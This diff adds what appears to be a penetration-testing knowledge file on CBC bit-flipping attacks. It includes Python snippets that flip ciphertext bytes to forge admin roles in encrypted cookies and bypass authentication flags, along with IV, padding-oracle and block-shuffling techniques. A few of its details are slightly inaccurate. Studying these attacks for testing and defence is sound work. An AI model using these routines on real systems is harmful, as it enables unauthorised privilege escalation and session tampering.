@@ -1,0 +1,244 @@
+<vulnerability_guide>
+  <title>CBC BIT FLIPPING ATTACKS</title>
+
+  <critical>CBC (Cipher Block Chaining) bit flipping allows attackers to manipulate encrypted data without knowing the key. By flipping bits in a ciphertext block, the corresponding bits in the next block's plaintext are flipped predictably. This enables bypassing authentication, modifying encrypted cookies, and manipulating encrypted data fields.</critical>
+
+  <scope>
+    - CBC mode vulnerability exploitation
+    - Encrypted cookie manipulation
+    - Authentication bypass via bit flipping
+    - Predictable IV attacks
+    - Padding oracle interaction
+    - Encrypted parameter tampering
+  </scope>
+
+  <methodology>
+    1. CBC MODE DETECTION
+       {% raw %}
+       # Identify CBC-encrypted data
+
+       # Characteristics:
+       # - Block-aligned (16 bytes for AES)
+       # - IV often prepended to ciphertext
+       # - Same plaintext = different ciphertext (due to IV)
+       # - Length: plaintext + IV + padding
+
+       # Test for block cipher:
+       # Encrypt same message twice
+       # Different ciphertext = random IV (good sign for CBC)
+
+       # Look for:
+       # - Encrypted cookies
+       # - Session tokens
+       # - Encrypted form fields
+       # - API parameters
+       {% endraw %}
+
+    2. UNDERSTANDING BIT FLIPPING
+       {% raw %}
+       # CBC decryption process:
+       # Plaintext[n] = Decrypt(Ciphertext[n]) XOR Ciphertext[n-1]
+
+       # Bit flip attack:
+       # XOR ciphertext[n-1] with flip_mask
+       # Corrupts plaintext[n-1] (unpredictable)
+       # Modifies plaintext[n] predictably
+
+       # Formula:
+       # new_plaintext[n] = original_plaintext[n] XOR flip_mask
+
+       # To change byte X to Y:
+       # flip_mask = X XOR Y
+       # Apply to corresponding byte in previous block
+       {% endraw %}
+
+    3. BASIC BIT FLIPPING ATTACK
+       {% raw %}
+       # Example: Changing user role in cookie
+       # Encrypted cookie contains: role=user
+
+       # Step 1: Identify block containing "role=user"
+       # Step 2: Calculate offset within block
+       # Step 3: Calculate flip mask
+
+       def flip_bit(ciphertext, position, original, target):
+           flip_mask = ord(original) ^ ord(target)
+           # XOR with previous block (position - 16 for AES)
+           modified = bytearray(ciphertext)
+           modified[position - 16] ^= flip_mask
+           return bytes(modified)
+
+       # Change "user" to "admn" (same length)
+       # u=0x75, a=0x61 -> flip_mask = 0x14
+       # s=0x73, d=0x64 -> flip_mask = 0x17
+       # e=0x65, m=0x6d -> flip_mask = 0x08
+       # r=0x72, n=0x6e -> flip_mask = 0x1c
+       {% endraw %}
+
+    4. ENCRYPTED COOKIE ATTACK
+       {% raw %}
+       # Common encrypted cookie format:
+       # username=alice&admin=0&timestamp=12345
+
+       # Attack: Change admin=0 to admin=1
+
+       import base64
+
+       def attack_cookie(cookie_b64):
+           cookie = base64.b64decode(cookie_b64)
+
+           # Find position of '0' in admin=0
+           # Typically after IV (16 bytes) + variable offset
+
+           # If admin=0 is at offset 25:
+           # Modify byte at offset 25-16=9 in IV/previous block
+
+           modified = bytearray(cookie)
+           # XOR: '0' (0x30) to '1' (0x31) = 0x01
+           modified[9] ^= 0x01
+
+           return base64.b64encode(bytes(modified))
+       {% endraw %}
+
+    5. AUTHENTICATION BYPASS
+       {% raw %}
+       # Bypass authentication checks
+
+       # Scenario: Token contains "auth=false"
+       # Target: Change to "auth=true" (length issue)
+
+       # Work around length mismatch:
+       # "auth=false" (10 chars)
+       # "auth=true_" (10 chars) - add padding char
+
+       # Or exploit implementation:
+       # Some parsers: auth=false&auth=true -> last value wins
+       # Inject new parameter
+
+       # Null byte injection:
+       # "auth=false" -> "auth=true\x00lse"
+       # Parser may stop at null byte
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <iv_manipulation>
+      {% raw %}
+      # First block manipulation via IV
+
+      # IV is first "ciphertext" block for block 1
+      # Modify IV to change plaintext block 1
+
+      # Same calculation applies:
+      # new_plaintext[0] = original_plaintext[0] XOR iv_modification
+
+      # If IV is separate from ciphertext:
+      original_iv = bytes.fromhex('...')
+      modified_iv = bytearray(original_iv)
+      modified_iv[offset] ^= flip_mask
+      {% endraw %}
+    </iv_manipulation>
+
+    <known_plaintext_attack>
+      {% raw %}
+      # When you know part of plaintext
+
+      # Common known values:
+      # - Fixed headers/formats
+      # - Predictable timestamps
+      # - Standard field names
+
+      # Example: JSON format
+      # Known: {"user":"alice","admin":false}
+      # Structure is predictable
+
+      # Calculate exact positions
+      # Apply targeted bit flips
+      # false (5 chars) -> true_ (5 chars with space)
+      {% endraw %}
+    </known_plaintext_attack>
+
+    <block_shuffling>
+      {% raw %}
+      # Rearrange ciphertext blocks
+
+      # If each block independently decryptable:
+      # Reorder blocks to reorder data
+
+      # Cut-and-paste attack:
+      # Take block from another ciphertext
+      # Insert into target ciphertext
+      # XOR behavior may produce useful result
+
+      # Limitations:
+      # - Block alignment required
+      # - First 16 bytes of each block corrupted
+      # - Need compatible block content
+      {% endraw %}
+    </block_shuffling>
+
+    <padding_oracle_combo>
+      {% raw %}
+      # Combine with padding oracle
+
+      # Padding oracle reveals plaintext
+      # Then use bit flipping for modification
+
+      # Workflow:
+      # 1. Use padding oracle to decrypt
+      # 2. Know exact plaintext
+      # 3. Calculate bit flips for target
+      # 4. Apply modifications
+      # 5. Result is valid encrypted target
+      {% endraw %}
+    </padding_oracle_combo>
+
+    <multi_block_corruption>
+      {% raw %}
+      # Handle block corruption gracefully
+
+      # Bit flip corrupts previous block
+      # Strategy: Accept corruption or avoid it
+
+      # Option 1: Corrupt padding
+      # Put modification near end
+      # Corrupted block is padding
+
+      # Option 2: Corrupt header
+      # Modify early blocks
+      # Corrupted data is ignorable header
+
+      # Option 3: Multi-request attack
+      # Corrupt different blocks per request
+      # Combine valid parts from each response
+      {% endraw %}
+    </multi_block_corruption>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor for encrypted data modification attempts
+    - Check for unusual cookie lengths
+    - Implement authentication at server side
+    - Use authenticated encryption (GCM, not CBC)
+    - Validate decrypted data integrity
+  </detection>
+
+  <validation>
+    - Identify CBC-encrypted data
+    - Successfully modify encrypted content
+    - Bypass authentication via bit flipping
+    - Change user roles in encrypted tokens
+    - Document exploitable fields
+  </validation>
+
+  <pro_tips>
+    - CBC without MAC is always vulnerable to bit flipping
+    - First block can be modified via IV manipulation
+    - Block size is typically 16 bytes (AES) or 8 bytes (3DES)
+    - Padding oracle + bit flipping = full encryption/decryption
+    - Modern systems should use authenticated encryption (AES-GCM)
+    - Test with single-bit changes first to understand structure
+  </pro_tips>
+
+  <remember>CBC bit flipping is a fundamental cryptographic attack that works without knowing the key. If you can modify ciphertext and see the decrypted result (or observe application behavior), you can likely manipulate the plaintext. The key insight: XORing ciphertext block N-1 XORs plaintext block N. Every CBC implementation without authentication is potentially vulnerable.</remember>
+</vulnerability_guide>
